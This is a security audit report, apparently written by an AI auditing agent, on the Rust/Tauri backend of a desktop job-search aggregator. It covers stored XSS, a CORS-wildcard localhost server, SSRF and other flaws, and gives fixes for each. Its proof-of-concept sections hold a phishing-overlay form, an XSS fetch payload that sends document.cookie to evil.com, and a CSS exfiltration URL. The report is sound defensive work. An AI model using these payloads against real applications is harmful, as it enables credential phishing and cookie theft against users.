# JobSentinel Security Audit Report

**Date:** 2025-07-13
**Auditor:** Security Audit Agent (Elite)
**Scope:** `src-tauri/` — All Rust backend code, Tauri commands, IPC boundary, and configuration
**Focus Areas:** XSS / WebView Injection, Trust Boundary Violations across all `#[tauri::command]` functions
**Application:** JobSentinel — Tauri v2 desktop job search aggregator
**Risk Context:** Desktop application processing untrusted web content (scraped HTML from 10+ job boards, user-submitted bookmarklet data, user-controlled URLs)

---

## Executive Summary

JobSentinel's Rust backend demonstrates **strong foundational security practices**: parameterized SQL queries (sqlx), OS-native credential storage via keyring, typed IPC for credentials, and minimal Tauri capability permissions. However, the application's core purpose — ingesting and displaying untrusted web content — creates a significant attack surface that is **not adequately addressed**. The most critical finding is that scraped job data (including full HTML descriptions) flows from external websites through the database to the WebView **without any HTML sanitization**, creating a Stored XSS vector. Combined with a CORS-wildcard bookmarklet server that accepts unauthenticated external input, an attacker could inject persistent malicious content into the application.

**Finding Summary:**

| # | Severity | Finding | CWE |
|---|----------|---------|-----|
| 1 | **CRITICAL** | Stored XSS via Unsanitized Scraped Job Data | CWE-79 |
| 2 | **HIGH** | Bookmarklet Server: CORS Wildcard + No Authentication | CWE-346 / CWE-942 |
| 3 | **HIGH** | SSRF via Import URL Fetcher (No Host Validation) | CWE-918 |
| 4 | **MEDIUM** | Bookmarklet Server Error Messages Leak Internal Details | CWE-209 |
| 5 | **MEDIUM** | No Input Length Limits on Most IPC String Parameters | CWE-770 |
| 6 | **MEDIUM** | FTS5 Query Syntax Injection via Unsanitized User Input | CWE-74 |
| 7 | **LOW** | CSP Allows `unsafe-inline` for Styles | CWE-1021 |
| 8 | **LOW** | Bookmarklet Server: Fixed Buffer Truncates Large Payloads | CWE-120 |
| 9 | **INFO** | DevTools Not Explicitly Disabled in Release Builds | — |
| 10 | **INFO** | `open_deep_link` Permits Arbitrary HTTP/HTTPS URLs | — |

**Positive Findings (Defense in Depth):**

| Control | Status | Location |
|---------|--------|----------|
| Parameterized SQL (sqlx `.bind()`) | ✅ All queries | `core/db/queries.rs`, all command files |
| OS Keyring for Credentials | ✅ | `commands/credentials.rs` |
| Typed CredentialKey Enum Validation | ✅ | `commands/credentials.rs:25` |
| Path Traversal Protection (`canonicalize` + allowlist) | ✅ | `commands/feedback/mod.rs:29-54` |
| Slack Webhook URL Validation (host/scheme/path) | ✅ | `core/notify/slack.rs` |
| LinkedIn Auth URL Validation | ✅ | `commands/linkedin_auth.rs:32-63` |
| HTML Escaping in Resume Templates | ✅ | `core/resume/templates.rs` (46 calls to `escape_html`) |
| Minimal Tauri Capabilities | ✅ | `capabilities/default.json` |
| Config Field Length Limits | ✅ | `core/config/validation.rs` |
| Deep Link Scheme Validation | ✅ | `commands/deeplinks.rs:64-72` (http/https only) |
| Bookmarklet Server Bound to Localhost Only | ✅ | `core/bookmarklet/server.rs:144` |
| `.env` Contains No Secrets | ✅ | Only `DATABASE_URL=sqlite:jobs.db` |

---

## Findings

---

### Finding 1: [CRITICAL] Stored XSS via Unsanitized Scraped Job Data

**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CVSS 3.1:** 8.6 (High — persistent XSS in a desktop app with broad data flow)
**Locations:**
- `src-tauri/src/commands/jobs.rs:63-73` (get_recent_jobs)
- `src-tauri/src/commands/jobs.rs:93-100` (get_job_by_id)
- `src-tauri/src/commands/jobs.rs:125-134` (search_jobs_query)
- `src-tauri/src/core/bookmarklet/server.rs:280-336` (handle_import_request — DB insertion)
- All scraper modules under `src-tauri/src/core/scrapers/`

#### Description

Job data scraped from external websites — including `title`, `company`, `description`, and `location` fields — is stored in the SQLite database and served to the WebView frontend via `serde_json::to_value(&job)` **without any HTML sanitization or encoding**. The `description` field is particularly dangerous as it often contains full HTML markup from job board pages.

The entire data pipeline is unsanitized:
```
External Website → Scraper (raw HTML) → Database (raw HTML) → IPC JSON → WebView (raw HTML rendered)
```

The application has a proper `escape_html` function used in `core/resume/templates.rs` (46 calls), proving the developers understand HTML encoding — but it is **never applied** to scraped job data anywhere in the pipeline.

#### Affected Code

```rust
// src-tauri/src/commands/jobs.rs:55-83
pub async fn get_recent_jobs(
    limit: usize,
    state: State<'_, AppState>,
) -> Result<Vec<Value>, String> {
    match state.database.get_recent_jobs(limit as i64).await {
        Ok(jobs) => {
            let jobs_json: Vec<Value> = jobs
                .into_iter()
                .filter_map(|job| {
                    serde_json::to_value(&job)  // ← Raw scraped HTML in .description
                        .map_err(|e| { /* ... */ })
                        .ok()
                })
                .collect();
            Ok(jobs_json)  // ← Sent directly to WebView
        }
        // ...
    }
}
```

#### Impact

A malicious job posting on any supported job board (Greenhouse, Lever, LinkedIn, Dice, Glassdoor, HN, RemoteOK, SimplyHired, USAJobs, WeWorkRemotely, YC) could embed JavaScript in the job `description` or `title`. When the user views this job in the WebView:

1. **Script execution** in the WebView context (limited by CSP `script-src 'self'`, but see CSP bypass techniques)
2. **HTML injection** to create phishing overlays (fake login forms, credential harvesting)
3. **CSS injection** via `style-src 'unsafe-inline'` to manipulate the UI, hide security indicators, or create clickjacking overlays
4. **Data exfiltration** via allowed `connect-src` domains (Slack, Discord webhooks) or by triggering IPC commands

Combined with Finding 7 (CSP `unsafe-inline` for styles), an attacker can create convincing phishing overlays without needing script execution.

#### Proof of Concept

A malicious Greenhouse job posting with:
```html
<script>/* blocked by CSP */</script>

<!-- But this works with style-src 'unsafe-inline': -->
<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:99999">
  <h2>Session expired — please re-enter your credentials</h2>
  <form action="https://hooks.slack.com/services/attacker/webhook">
    <input name="email" placeholder="Email">
    <input name="password" type="password" placeholder="Password">
    <button>Sign In</button>
  </form>
</div>
```

The CSP `connect-src` allowlist includes `https://hooks.slack.com` and `https://discord.com`, so the form could exfiltrate data to attacker-controlled webhooks.

#### Remediation

**Option A — Backend sanitization (recommended):** Sanitize all scraped data before DB insertion.

```toml
# Cargo.toml
[dependencies]
ammonia = "4"
```

```rust
// src-tauri/src/core/sanitize.rs (new module)
use ammonia::Builder;
use std::collections::HashSet;

/// Sanitize HTML from scraped job descriptions.
/// Allows safe formatting tags, strips all scripts/events/forms.
pub fn sanitize_job_html(html: &str) -> String {
    Builder::default()
        .tags(["p", "br", "b", "i", "em", "strong", "ul", "ol", "li", "h1", "h2", "h3", "h4", "a", "span", "div"]
            .iter().copied().collect::<HashSet<&str>>())
        .url_schemes(["https", "http"].iter().copied().collect::<HashSet<&str>>())
        .link_rel(Some("noopener noreferrer"))
        .strip_comments(true)
        .clean(html)
        .to_string()
}

/// Strip ALL HTML — use for titles, company names, locations
pub fn strip_html(input: &str) -> String {
    ammonia::clean_text(input)
}
```

Apply before DB insertion in scrapers and bookmarklet server:
```rust
job.title = strip_html(&job.title);
job.company = strip_html(&job.company);
job.location = job.location.map(|l| strip_html(&l));
job.description = sanitize_job_html(&job.description);
```

**Option B — Frontend sanitization:** Use DOMPurify in the WebView before rendering. Less safe (defense in depth should do both).

#### References
- [CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
- [ammonia crate (Rust HTML sanitizer)](https://docs.rs/ammonia/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)

---

### Finding 2: [HIGH] Bookmarklet Server — CORS Wildcard with No Authentication

**CWE:** CWE-346 (Origin Validation Error), CWE-942 (Overly Permissive Cross-domain Whitelist)
**CVSS 3.1:** 7.3 (High — unauthenticated data injection from any origin)
**Location:** `src-tauri/src/core/bookmarklet/server.rs:234`

#### Description

The bookmarklet HTTP server listens on localhost and responds with `Access-Control-Allow-Origin: *`, allowing **any website** the user visits to POST arbitrary job data directly into the application's database. There is no authentication, no CSRF token, and no origin validation.

While the server is bound to `127.0.0.1` (good — not network-accessible), any JavaScript running in the user's browser can reach `http://127.0.0.1:<port>` via CORS.

#### Affected Code

```rust
// src-tauri/src/core/bookmarklet/server.rs:233-234
let response_data = format!(
    "HTTP/1.1 {}\r\n...\r\nAccess-Control-Allow-Origin: *\r\n...",
    //                                                    ^^^
    // Any website can POST data to this endpoint
    status, content_type, response.len(), response
);
```

The bookmarklet data goes straight to DB insertion (lines 315-336) with only structural validation (required fields present), not content validation:

```rust
// src-tauri/src/core/bookmarklet/server.rs:261-270
let job_data: BookmarkletJobData = match serde_json::from_str(body) {
    Ok(data) => data,
    Err(e) => { /* ... */ }
};

// Validates required fields exist but NOT content safety
if let Err(e) = job_data.validate() { /* ... */ }

// Direct insert — no sanitization of title, company, description
sqlx::query("INSERT INTO jobs (...) VALUES (?, ?, ?, ?, ?, ...)")
    .bind(&title)       // ← Could be "<img onerror=alert(1)>"
    .bind(&company)     // ← Could be malicious HTML
    .bind(&description) // ← Could be full XSS payload
```

#### Impact

1. **Blind XSS injection** — Any website the user visits can inject malicious job entries with XSS payloads that persist in the database and render when the user opens JobSentinel (amplified by Finding 1)
2. **Data pollution** — Flood the job database with fake entries, degrading the user experience
3. **Phishing** — Inject convincing fake job postings with links to credential-harvesting sites
4. **CSRF** — Any web page can trigger job imports without user consent

#### Proof of Concept

A malicious website the user visits includes:
```javascript
// Runs invisibly on any malicious/compromised webpage
fetch('http://127.0.0.1:42069/api/bookmarklet/import', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: '<img src=x onerror="document.location=\'https://evil.com/steal?\'+document.cookie">',
    company: 'Legitimate Corp',
    description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h1>Update Required</h1><p>Enter credentials to continue...</p></div>',
    url: 'https://example.com/job/12345'
  })
});
```

#### Remediation

**1. Replace CORS wildcard with a secret-based auth token:**

```rust
use rand::Rng;

// Generate a random token at server start
let auth_token: String = rand::thread_rng()
    .sample_iter(&rand::distributions::Alphanumeric)
    .take(32)
    .map(char::from)
    .collect();

// Embed token in the bookmarklet JS code the user copies
// The bookmarklet includes: fetch('http://127.0.0.1:PORT/api/bookmarklet/import', {
//   headers: { 'Authorization': 'Bearer <TOKEN>' }
// })
```

**2. Validate the Authorization header on every request:**

```rust
fn validate_auth(request: &str, expected_token: &str) -> bool {
    request.lines()
        .find(|line| line.to_lowercase().starts_with("authorization:"))
        .and_then(|line| line.strip_prefix("Authorization: Bearer "))
        .map(|token| {
            use subtle::ConstantTimeEq;
            token.as_bytes().ct_eq(expected_token.as_bytes()).into()
        })
        .unwrap_or(false)
}
```

**3. Restrict CORS to specific origins (if token approach isn't sufficient):**

```rust
// Instead of Access-Control-Allow-Origin: *
// Use no CORS header at all (same-origin only) or validate against a list
```

#### References
- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
- [CWE-942: Overly Permissive Cross-domain Whitelist](https://cwe.mitre.org/data/definitions/942.html)
- [OWASP CORS Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)

---

### Finding 3: [HIGH] SSRF via Import URL Fetcher (No Host/IP Validation)

**CWE:** CWE-918 — Server-Side Request Forgery (SSRF)
**CVSS 3.1:** 6.5 (Medium-High — limited by desktop context but still exploitable)
**Locations:**
- `src-tauri/src/commands/import.rs:21-75` (preview_job_import)
- `src-tauri/src/commands/import.rs:81-203` (import_job_from_url)
- `src-tauri/src/core/import/fetcher.rs:19-64` (fetch_job_page)

#### Description

The `import_job_from_url` and `preview_job_import` commands accept a URL from the frontend and fetch it server-side using reqwest. The fetcher validates the URL scheme (http/https) but does **not** validate the target host or IP address. An attacker who can influence the URL parameter (via deep link, bookmarklet injection, or other vector) can make the application fetch:

- `http://127.0.0.1:*` — Probe localhost services
- `http://169.254.169.254/latest/meta-data/` — AWS/cloud metadata endpoints
- `http://[::1]/` — IPv6 loopback
- Internal network hosts (`http://192.168.x.x/`, `http://10.x.x.x/`)
- `http://localhost:PORT/api/bookmarklet/import` — Self-SSRF into the bookmarklet server

#### Affected Code

```rust
// src-tauri/src/core/import/fetcher.rs:19-31
pub async fn fetch_job_page(url: &str) -> ImportResult<String> {
    let parsed_url = reqwest::Url::parse(url)
        .map_err(|e| ImportError::InvalidUrl(format!("Invalid URL format: {}", e)))?;

    // Only validates scheme — NOT host/IP
    if parsed_url.scheme() != "https" && parsed_url.scheme() != "http" {
        return Err(ImportError::InvalidUrl(/* ... */));
    }

    // No check for:
    // - localhost / 127.0.0.1 / [::1]
    // - Private IP ranges (10.x, 172.16-31.x, 192.168.x)
    // - Link-local (169.254.x.x)
    // - Cloud metadata (169.254.169.254)

    let client = Client::builder()
        .timeout(HTTP_TIMEOUT)
        .build()?;

    let response = client.get(url).send().await?;  // ← Fetches ANY http/https URL
```

#### Impact

In a desktop application context, SSRF impact is more limited than in a server-side app, but still significant:

1. **Port scanning** — Probe which services are running on the user's machine and local network
2. **Internal service interaction** — Send requests to internal APIs, databases, admin panels
3. **Self-SSRF** — Interact with the bookmarklet server (Finding 2), injecting data
4. **Data exfiltration** — If combined with a response-reflecting bug, leak internal data
5. **Cloud metadata** — If the user runs JobSentinel on a cloud VM, access instance metadata/credentials

#### Remediation

Add host validation to the fetcher:

```rust
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

fn is_safe_url(url: &reqwest::Url) -> Result<(), ImportError> {
    // Block non-HTTP schemes
    if !matches!(url.scheme(), "http" | "https") {
        return Err(ImportError::InvalidUrl("Only http/https allowed".into()));
    }

    let host = url.host_str()
        .ok_or_else(|| ImportError::InvalidUrl("No host in URL".into()))?;

    // Block localhost variants
    let blocked_hosts = ["localhost", "127.0.0.1", "[::1]", "0.0.0.0"];
    if blocked_hosts.contains(&host.to_lowercase().as_str()) {
        return Err(ImportError::InvalidUrl("Local addresses not allowed".into()));
    }

    // Block private/reserved IP ranges
    if let Ok(ip) = host.parse::<IpAddr>() {
        match ip {
            IpAddr::V4(ipv4) => {
                if ipv4.is_loopback()
                    || ipv4.is_private()
                    || ipv4.is_link_local()
                    || ipv4.is_broadcast()
                    || ipv4.is_unspecified()
                    || ipv4.octets()[0] == 169 && ipv4.octets()[1] == 254 // link-local/metadata
                {
                    return Err(ImportError::InvalidUrl(
                        "Private/reserved IP addresses not allowed".into()
                    ));
                }
            }
            IpAddr::V6(ipv6) => {
                if ipv6.is_loopback() || ipv6.is_unspecified() {
                    return Err(ImportError::InvalidUrl(
                        "Private/reserved IP addresses not allowed".into()
                    ));
                }
            }
        }
    }

    Ok(())
}
```

**Note:** Also consider DNS rebinding — resolve the hostname first and check the resolved IP before connecting. The `reqwest` client can be configured with a custom resolver or use `trust-dns` for this.

#### References
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---

### Finding 4: [MEDIUM] Bookmarklet Server Error Messages Leak Internal Details

**CWE:** CWE-209 — Generation of Error Message Containing Sensitive Information
**Location:** `src-tauri/src/core/bookmarklet/server.rs:266, 306, 352`

#### Description

Error responses from the bookmarklet server include raw error messages from serde_json and sqlx, which can reveal internal details about the application's database schema, JSON structure expectations, and file paths.

#### Affected Code

```rust
// Line 266 — JSON parse error leaks expected structure
format!(r#"{{"error":"Invalid JSON: {}"}}"#, e)
// Could return: "Invalid JSON: missing field `title` at line 1 column 42"

// Line 306 — Database error leaks schema
format!(r#"{{"error":"Database error: {}"}}"#, e)
// Could return: "Database error: UNIQUE constraint failed: jobs.hash"

// Line 352 — Database insert error leaks column info
format!(r#"{{"error":"Failed to import job: {}"}}"#, e)
// Could return: "Failed to import job: NOT NULL constraint failed: jobs.title"
```

#### Impact

Information disclosure that aids reconnaissance:
- Reveals database schema (table/column names, constraints)
- Reveals expected JSON field names and types
- Could reveal file paths in SQLite errors

#### Remediation

Return generic error messages externally; log details internally:

```rust
Err(e) => {
    tracing::error!("Failed to parse bookmarklet JSON: {}", e);
    return (
        r#"{"error":"Invalid request data"}"#.to_string(),
        "application/json".to_string(),
    );
}
```

---

### Finding 5: [MEDIUM] No Input Length Limits on Most IPC String Parameters

**CWE:** CWE-770 — Allocation of Resources Without Limits or Throttling
**Locations:** Multiple command files — representative examples:
- `commands/jobs.rs:112` — `search_jobs_query(query: String, ...)`
- `commands/ats.rs` — `upsert_screening_answer(answer: String, ...)`
- `commands/resume.rs` — `create_cover_letter_template(content: String, ...)`
- `commands/salary.rs` — `generate_negotiation_script(scenario: String, ...)`
- `commands/market.rs` — `set_job_notes(notes: Option<String>, ...)`

#### Description

Most `#[tauri::command]` functions accept `String` parameters from the frontend without any length validation. While the config validation module (`core/config/validation.rs`) enforces length limits on configuration fields, the vast majority of IPC string inputs have no such limits.

#### Impact

- **Memory exhaustion** — Frontend could send multi-gigabyte strings, causing the Rust backend to allocate excessive memory
- **Database bloat** — Unlimited-length strings stored in SQLite could grow the database enormously
- **DoS** — FTS5 indexing or database operations on extremely long strings could be very slow
- **Amplification** — Combined with search_jobs_query, a very long FTS5 query could cause expensive full-text search operations

#### Remediation

Add a shared validation macro or function:

```rust
const MAX_QUERY_LENGTH: usize = 1_000;
const MAX_NOTE_LENGTH: usize = 50_000;
const MAX_CONTENT_LENGTH: usize = 100_000;

fn validate_length(input: &str, max: usize, field_name: &str) -> Result<(), String> {
    if input.len() > max {
        return Err(format!("{} exceeds maximum length of {} characters", field_name, max));
    }
    Ok(())
}

// Usage in commands:
#[tauri::command]
pub async fn search_jobs_query(query: String, limit: usize, ...) -> Result<Vec<Value>, String> {
    validate_length(&query, MAX_QUERY_LENGTH, "Search query")?;
    // ...
}
```

---

### Finding 6: [MEDIUM] FTS5 Query Syntax Injection via Unsanitized User Input

**CWE:** CWE-74 — Improper Neutralization of Special Elements in Output Used by a Downstream Component (Injection)
**Location:** `src-tauri/src/core/db/queries.rs:95`

#### Description

The `search_jobs` database function passes user input directly to SQLite FTS5 `MATCH` via a parameterized query. While this is **not SQL injection** (the value is properly bound), FTS5 has its own query syntax that the user can exploit. FTS5 supports operators like `AND`, `OR`, `NOT`, `NEAR()`, `*` wildcards, column filters (`title:word`), and phrase matching (`"exact phrase"`).

#### Affected Code

```rust
// src-tauri/src/core/db/queries.rs:94-98
let job_ids: Vec<i64> =
    sqlx::query_scalar("SELECT rowid FROM jobs_fts WHERE jobs_fts MATCH ? LIMIT ?")
        .bind(query)  // ← Raw user input passed to FTS5 MATCH
        .bind(limit)
        .fetch_all(self.pool())
        .await?;
```

#### Impact

- **Error-based DoS** — Malformed FTS5 queries (e.g., unbalanced quotes `"hello`, orphan operators `AND AND`) cause SQLite errors that propagate as `sqlx::Error`, potentially crashing the search functionality
- **Information disclosure** — Column filter syntax (`description:password OR description:secret`) lets users target specific columns, potentially revealing data that would not normally appear in search results
- **Unexpected wildcard expansion** — Queries like `*` or `a*` could return the entire database, causing performance issues

#### Remediation

Sanitize FTS5 special characters before passing to MATCH:

```rust
/// Escape FTS5 special syntax characters from user queries
fn sanitize_fts5_query(input: &str) -> String {
    // Quote the entire input as a phrase to disable FTS5 operators
    // OR strip special characters
    let cleaned: String = input
        .chars()
        .filter(|c| c.is_alphanumeric() || c.is_whitespace() || *c == '-' || *c == '\'')
        .collect();

    if cleaned.trim().is_empty() {
        return String::new();
    }

    // Wrap individual words in quotes to prevent operator interpretation
    cleaned
        .split_whitespace()
        .map(|word| format!("\"{}\"", word))
        .collect::<Vec<_>>()
        .join(" ")
}
```

---

### Finding 7: [LOW] CSP Allows `unsafe-inline` for Styles

**CWE:** CWE-1021 — Improper Restriction of Rendered UI Layers or Frames
**Location:** `src-tauri/tauri.conf.json:42`

#### Description

The Content Security Policy includes `style-src 'self' 'unsafe-inline'`, which allows inline `style` attributes in HTML. This significantly amplifies the impact of Finding 1 (Stored XSS) because even without script execution, an attacker can use CSS to:

```
style-src 'self' 'unsafe-inline'
                  ^^^^^^^^^^^^^^ allows arbitrary inline CSS
```

#### Affected Code

```json
// tauri.conf.json:42
"csp": "default-src 'self'; connect-src 'self' https://hooks.slack.com https://discord.com https://outlook.office.com https://boards.greenhouse.io https://boards-api.greenhouse.io https://jobs.lever.co https://api.lever.co https://api.jobswithgpt.com; style-src 'self' 'unsafe-inline'; script-src 'self'"
```

#### Impact

With `unsafe-inline` styles and unsanitized HTML (Finding 1), an attacker can:
- Create full-page phishing overlays (`position:fixed; width:100vw; height:100vh`)
- Hide legitimate UI elements (`display:none`)
- Create fake UI elements that mimic the real interface
- Perform CSS-based data exfiltration using `background-image: url('https://evil.com/leak?data=...')`

**Note:** The CSP does block `script-src` to `'self'` only (good), and `connect-src` is properly limited to known domains. The `unsafe-inline` on styles is the main gap.

#### Remediation

If the frontend framework allows it, use a nonce-based CSP for styles:

```json
"csp": "default-src 'self'; style-src 'self' 'nonce-{RANDOM}'; script-src 'self'"
```

If `unsafe-inline` is required for the framework (many CSS-in-JS libraries need it), the priority should be addressing Finding 1 first — sanitizing HTML eliminates the ability to inject inline styles.

---

### Finding 8: [LOW] Bookmarklet Server — Fixed Buffer Truncates Large Payloads

**CWE:** CWE-120 — Buffer Copy without Checking Size of Input
**Location:** `src-tauri/src/core/bookmarklet/server.rs:186-209`

#### Description

The bookmarklet server uses a fixed 8192-byte buffer to read HTTP requests. It does not parse the `Content-Length` header, so payloads larger than ~7KB (after HTTP headers) are silently truncated. The truncated data is then passed to `serde_json::from_str()`.

#### Affected Code

```rust
// server.rs:186
let mut buffer = vec![0u8; 8192];
let mut total_read = 0;

loop {
    match stream.try_read(&mut buffer[total_read..]) {
        Ok(0) => break,
        Ok(n) => {
            total_read += n;
            if total_read >= buffer.len() {
                break;  // ← Silently stops reading at 8192 bytes
            }
            // ...
        }
    }
}
```

#### Impact

- **Data integrity** — Large job descriptions could be truncated mid-HTML-tag, creating malformed HTML that breaks rendering
- **JSON injection** — A carefully crafted payload at exactly the truncation boundary could result in malformed JSON that `serde_json` rejects (benign) OR, in theory, truncated JSON that happens to be valid but with different meaning (unlikely but possible)

#### Remediation

1. Parse `Content-Length` header and reject requests exceeding a reasonable limit (e.g., 64KB)
2. Read exactly `Content-Length` bytes, not a fixed buffer
3. Return `413 Payload Too Large` for oversized requests

```rust
// Extract Content-Length from headers
let content_length = request.lines()
    .find(|l| l.to_lowercase().starts_with("content-length:"))
    .and_then(|l| l.split(':').nth(1))
    .and_then(|v| v.trim().parse::<usize>().ok())
    .unwrap_or(0);

const MAX_BODY_SIZE: usize = 65536; // 64KB
if content_length > MAX_BODY_SIZE {
    return ("413 Payload Too Large", r#"{"error":"Request too large"}"#);
}
```

---

### Finding 9: [INFO] DevTools Not Explicitly Disabled in Release Builds

**Location:** N/A — absence of `#[cfg(debug_assertions)]` guard for devtools

#### Description

No `#[cfg(debug_assertions)]` guard was found that conditionally enables/disables DevTools for release vs. debug builds. If the `tauri-plugin-devtools` is included unconditionally, users (or attackers with local access) could inspect the WebView, modify frontend JavaScript, and bypass client-side security controls.

#### Remediation

```rust
// In main.rs or wherever the Tauri app is built
#[cfg(debug_assertions)]
let builder = builder.plugin(tauri_plugin_devtools::init());
```

Verify whether `tauri-plugin-devtools` is in `Cargo.toml` dependencies and ensure it's behind a feature flag or debug-only.

---

### Finding 10: [INFO] `open_deep_link` Permits Arbitrary HTTP/HTTPS URLs

**Location:** `src-tauri/src/commands/deeplinks.rs:64-91`

#### Description

The `open_deep_link` command validates that URLs use `http` or `https` schemes (good — blocks `file://`, `javascript:`, etc.) but allows **any** HTTP/HTTPS URL to be opened in the user's default browser. While scheme validation prevents the most dangerous attacks, this still allows:

- Opening phishing URLs in the user's browser
- Opening URLs that trigger downloads of malicious files
- Tracking/fingerprinting via unique URLs

#### Affected Code

```rust
fn validate_deep_link_url(url: &str) -> Result<(), String> {
    let parsed = url::Url::parse(url).map_err(|_| "Invalid URL format".to_string())?;
    match parsed.scheme() {
        "https" => Ok(()),
        "http" => Ok(()),  // ← Any http/https URL passes
        _ => Err(format!("Blocked scheme '{}': only http/https allowed", parsed.scheme())),
    }
}
```

#### Remediation

Consider adding a domain allowlist for known job board domains:

```rust
const ALLOWED_DOMAINS: &[&str] = &[
    "greenhouse.io", "lever.co", "linkedin.com", "indeed.com",
    "glassdoor.com", "dice.com", "usajobs.gov", "weworkremotely.com",
    // Add other supported job boards
];

fn validate_deep_link_url(url: &str) -> Result<(), String> {
    let parsed = url::Url::parse(url).map_err(|_| "Invalid URL format".to_string())?;

    if !matches!(parsed.scheme(), "http" | "https") {
        return Err("Only http/https URLs allowed".into());
    }

    let host = parsed.host_str().ok_or("No host in URL")?;
    if !ALLOWED_DOMAINS.iter().any(|d| host == *d || host.ends_with(&format!(".{}", d))) {
        return Err(format!("Domain '{}' is not in the allowed list", host));
    }

    Ok(())
}
```

---

## Architecture Recommendations

### 1. Centralized Input Sanitization Layer

Create a `sanitize` module that all scrapers, importers, and bookmarklet handlers must use before database insertion:

```
Scraper/Import/Bookmarklet → sanitize::sanitize_job() → Database
```

### 2. Defense-in-Depth for XSS

Implement sanitization at **both** layers:
- **Backend:** Sanitize before DB insertion (prevents persistence of malicious content)
- **Frontend:** Use DOMPurify or equivalent before rendering any `description` HTML (defense in depth)

### 3. Consider Replacing Raw TCP with a Proper HTTP Framework

The bookmarklet server implements HTTP manually with a raw TCP listener. This misses standard HTTP security features (proper header parsing, content-length validation, request size limits, timeouts). Consider replacing with a lightweight HTTP server like `axum` or `tiny_http` bound to localhost.

### 4. Tauri IPC Validation Middleware

Consider a shared validation layer for all IPC commands:

```rust
// Shared validation trait
trait ValidateInput {
    fn validate(&self) -> Result<(), String>;
}

// Or a macro:
macro_rules! validate_string_length {
    ($val:expr, $max:expr, $name:expr) => {
        if $val.len() > $max {
            return Err(format!("{} exceeds {} character limit", $name, $max));
        }
    };
}
```

---

## Risk Matrix

| Finding | Likelihood | Impact | Risk |
|---------|-----------|--------|------|
| 1. Stored XSS | **High** (any scraped site) | **High** (phishing, UI manipulation) | **CRITICAL** |
| 2. CORS Wildcard | **High** (any visited site) | **High** (persistent data injection) | **HIGH** |
| 3. SSRF | **Medium** (requires attacker influence on URL) | **Medium** (local service probing) | **HIGH** |
| 4. Error Info Leak | **High** (always occurs on error) | **Low** (reconnaissance only) | **MEDIUM** |
| 5. No Length Limits | **Low** (requires malicious frontend) | **Medium** (DoS) | **MEDIUM** |
| 6. FTS5 Injection | **Medium** (any user search) | **Low** (errors, info disclosure) | **MEDIUM** |
| 7. unsafe-inline CSS | **High** (amplifies Finding 1) | **Medium** (phishing overlays) | **LOW** |
| 8. Buffer Truncation | **Low** (large payloads only) | **Low** (data integrity) | **LOW** |
| 9. DevTools in Prod | **Low** (requires local access) | **Low** (inspection only) | **INFO** |
| 10. Open URL | **Low** (requires data injection) | **Low** (browser phishing) | **INFO** |

---

## Remediation Priority

**Immediate (Week 1):**
1. 🔴 **Finding 1** — Add `ammonia` crate and sanitize all scraped/imported/bookmarklet job data before DB insertion
2. 🔴 **Finding 2** — Add auth token to bookmarklet server, remove CORS wildcard

**Short-term (Week 2-3):**
3. 🟠 **Finding 3** — Add host/IP validation to import URL fetcher
4. 🟠 **Finding 4** — Replace raw error messages with generic responses
5. 🟠 **Finding 5** — Add length validation to all IPC string parameters
6. 🟠 **Finding 6** — Sanitize FTS5 query input

**Medium-term (Month 1-2):**
7. 🟡 **Finding 7** — Evaluate removing `unsafe-inline` from style-src
8. 🟡 **Finding 8** — Implement proper Content-Length parsing in bookmarklet server
9. ⚪ **Finding 9** — Verify DevTools is disabled in release builds
10. ⚪ **Finding 10** — Consider domain allowlist for deep links

---

*End of Security Audit Report*
